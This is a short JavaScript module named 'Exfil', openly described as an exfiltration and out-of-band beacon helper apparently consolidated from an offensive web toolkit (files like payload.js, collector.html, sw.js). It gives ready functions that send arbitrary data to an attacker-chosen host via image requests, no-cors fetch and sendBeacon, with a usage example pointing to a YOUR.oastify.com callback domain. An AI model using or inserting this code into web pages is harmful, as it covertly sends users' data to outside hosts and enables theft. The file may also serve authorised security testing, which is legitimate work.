/**
 * Exfil — shared exfiltration / OOB beacon utility.
 *
 * Consolidates the duplicated new Image().src, fetch(), and sendBeacon()
 * patterns found in collector.html, sandbox.html, receiver.html,
 * pay-handler.html, payload.js, and sw.js.
 *
 * Usage:
 *   const exfil = Exfil.create('https://YOUR.oastify.com');
 *   exfil.beacon('tag', 'data');
 *   exfil.post('/path', { key: 'value' });
 *   exfil.ping('endpoint', { key: 'value' });
 */
window.Exfil = (function () {
  function create(baseUrl) {
    function beacon(tag, data) {
      var encoded = encodeURIComponent(
        typeof data === 'string' ? data : JSON.stringify(data)
      );
      new Image().src = baseUrl + '/?' + tag + '=' + encoded;
    }

    function beaconParams(params) {
      new Image().src = baseUrl + '/handler?' + new URLSearchParams(
        typeof params === 'string' ? { m: params } : params
      ).toString();
    }

    function post(path, data) {
      fetch(baseUrl + path, {
        method: 'POST',
        mode: 'no-cors',
        body: typeof data === 'string' ? data : JSON.stringify(data)
      });
    }

    function ping(tag, data) {
      return fetch(baseUrl + '/' + tag, {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify(data || {})
      });
    }

    function sendBeaconApi(tag, data) {
      navigator.sendBeacon(
        baseUrl + '/p?t=' + tag,
        JSON.stringify(data)
      );
    }

    return {
      beacon: beacon,
      beaconParams: beaconParams,
      post: post,
      ping: ping,
      sendBeacon: sendBeaconApi
    };
  }

  return { create: create };
})();
